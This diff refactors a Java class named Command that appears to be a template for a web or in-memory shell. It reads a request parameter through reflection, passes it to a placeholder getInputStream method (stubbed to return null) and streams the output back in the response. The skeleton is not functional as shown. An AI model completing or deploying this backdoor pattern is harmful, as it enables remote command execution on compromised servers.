@@ -11,23 +11,15 @@ import java.lang.reflect.Field;
 public class Command {
     public static String paramName;
 
-    private String getParam(String param) {
-        return param;
-    }
-
-    private InputStream getInputStream(String cmd) throws Exception {
-        return null;
-    }
-
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
         Object request = unwrapRequest(args[0]);
         Object response = unwrapResponse(args[1]);
         try {
-            String cmd = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
-            if (cmd != null) {
-                InputStream inputStream = getInputStream(cmd);
+            String param = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                 byte[] buf = new byte[8192];
                 int length;
@@ -36,12 +28,21 @@ public class Command {
                 }
                 return true;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return false;
     }
 
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
+    }
+
+    @SuppressWarnings("all")
     public Object unwrapRequest(Object request) {
         Object internalRequest = request;
         while (true) {
@@ -58,6 +59,7 @@ public class Command {
         }
     }
 
+    @SuppressWarnings("all")
     public Object unwrapResponse(Object response) {
         Object internalResponse = response;
         while (true) {
